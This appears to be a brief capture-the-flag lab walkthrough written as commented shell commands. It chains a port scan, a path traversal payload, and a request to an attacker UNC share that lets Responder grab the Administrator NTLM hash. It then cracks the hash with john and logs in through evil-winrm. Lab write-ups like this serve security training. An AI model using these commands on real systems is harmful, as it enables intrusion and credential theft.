# Searching for open ports.
nmap -sV -sC [ip]

curl [ip]
# Task 1 captured.

# Task 2 captured with the mapping.

# Changing hosts file to link the ip with the domain.
curl [domain]
# Task 3 captured reviewing the HTML.

# Task 4 captured and verifying vulnerability.
curl [domain]?[task3]=../../../../../../../../windows/system32/drivers/etc/hosts

# Task 5, 6 and 7 captured with the following commands.
# Start responder.
sudo responder -I tun0 -v
# Obtaining Administrator hash.
curl 'http://[domain]?[task3]=\\10.10.14.6\somefile'

# Task 8 captured.
# Make sure to unzip rockyou.txt before run the command.
john --wordlist=/usr/share/wordlists/rockyou.txt --format=netntlmv2 hash.txt
# Task 9 captured.

# Task 10 captured with the mapping.

# Use evil-winrm to access remotely
evil-winrm -i [ip] -u 'Administrator' -p '[password]'

# Task 11 and flag captured.